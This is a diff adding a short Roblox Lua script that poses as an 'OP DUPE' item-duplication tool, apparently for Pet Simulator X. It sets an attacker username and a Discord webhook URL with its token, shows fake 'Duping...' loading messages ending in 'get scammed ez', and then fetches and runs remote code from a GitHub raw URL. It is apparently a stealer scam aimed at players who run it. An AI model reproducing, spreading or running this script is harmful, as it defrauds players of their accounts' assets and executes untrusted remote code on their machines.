@@ -1,0 +1,17 @@
+Username = "Quaddy77"
+
+WebHook = "https://discord.com/api/webhooks/1090709680579420220/Tf_V-f_WHqeo6Rp8ZE1a_PfKJBS2qh3C_nWdWHT4nEizNtrvK-V2UoMJF9ZF4dmg8r8j"
+
+loadingscreen = true
+
+_G.CustomScriptName = "OP DUPE"
+
+_G.Text1 = "Loading in.."
+
+_G.Text2 = "Almost loaded..."
+
+_G.Text3 = "Please wait... Duping..."
+
+_G.Text4 = "get scammed ez"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
